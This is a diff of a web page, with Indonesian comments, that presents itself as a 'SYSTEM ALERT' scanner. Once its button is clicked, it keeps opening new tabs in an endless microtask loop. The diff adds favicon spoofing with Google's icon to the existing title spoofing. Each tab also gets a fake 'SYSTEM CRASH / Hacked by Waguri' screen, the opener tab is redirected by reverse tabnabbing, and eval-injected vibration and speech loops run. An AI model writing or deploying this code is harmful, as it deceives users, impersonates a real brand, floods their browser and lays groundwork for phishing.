@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Title Bar Spoofing + Reverse Tabnabbing</title>
+<title>Google Favicon Spoofing + Tabnabbing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -20,7 +20,7 @@ button:disabled { background: #555; cursor: not-allowed; }
 <body>
 <div class="panel" id="main-panel">
     <h1>⚠️ SYSTEM ALERT</h1>
-    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Title Spoofing + Tabnabbing).</p>
+    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Favicon Spoofing + Tabnabbing).</p>
     
     <button id="start-btn" type="button">Mulai Pemindaian</button>
     
@@ -55,7 +55,7 @@ startBtn.addEventListener("click", function() {
     efekHacker();
 
     let dipicu = 0;
-    statusDiv.textContent = "Memicu Title Spoofing + Tabnabbing...";
+    statusDiv.textContent = "Memicu Favicon Spoofing + Tabnabbing...";
 
     function picuTerusMenerus() {
         dipicu++;
@@ -65,10 +65,17 @@ startBtn.addEventListener("click", function() {
             
             if (w) {
                 try {
-                    // 2. TITLE BAR SPOOFING: Ubah judul tab menjadi "Google"
+                    // 2. TITLE BAR SPOOFING
                     w.document.title = "Google";
 
-                    // 3. Suntikkan konten "SYSTEM CRASH"
+                    // 3. FAVICON SPOOFING (Memasukkan logo Google ke tab bar)
+                    const link = w.document.createElement('link');
+                    link.rel = 'icon';
+                    // Menggunakan URL logo Google resmi
+                    link.href = 'https://www.google.com/favicon.ico'; 
+                    w.document.head.appendChild(link);
+
+                    // 4. Suntikkan konten "SYSTEM CRASH"
                     w.document.body.style.margin = "0";
                     w.document.body.style.padding = "0";
                     w.document.body.style.background = "#000";
@@ -84,24 +91,23 @@ startBtn.addEventListener("click", function() {
                         <div>
                             <h1 style="font-size:60px; text-shadow:0 0 20px #f00; animation:pulse 0.5s infinite;">SYSTEM CRASH</h1>
                             <p style="color:#0f0; font-size:20px;">Hacked by Waguri</p>
-                            <p style="color:#ff0; font-size:12px; margin-top:20px;">Title Bar: Google</p>
+                            <p style="color:#ff0; font-size:12px; margin-top:20px;">Favicon & Title: Google</p>
                         </div>
                         <style>
                             @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
                         </style>
                     `;
 
-                    // 4. REVERSE TABNABBING: Belokkan halaman utama ke situs lain
+                    // 5. REVERSE TABNABBING (Belokkan halaman utama)
                     try {
                         if (w.opener) {
-                            // Pura-pura menjadi halaman login yang sah
                             w.opener.location.href = 'https://example.com'; 
                         }
                     } catch(e) {
                         console.warn("Tabnabbing diblokir oleh browser: " + e.message);
                     }
 
-                    // --- GETAR & TTS DI TAB BARU ---
+                    // 6. GETAR & TTS DI TAB BARU
                     w.eval(`
                         if (navigator.vibrate) {
                             setInterval(function() {
@@ -124,11 +130,9 @@ startBtn.addEventListener("click", function() {
             statusDiv.textContent = `Membuka tab spoofing ke-${dipicu}...`;
         } catch(e) {}
 
-        // Panggil dirinya sendiri via Microtask
         queueMicrotask(picuTerusMenerus);
     }
 
-    // Mulai Looping
     queueMicrotask(function() {
         queueMicrotask(function() {
             picuTerusMenerus();
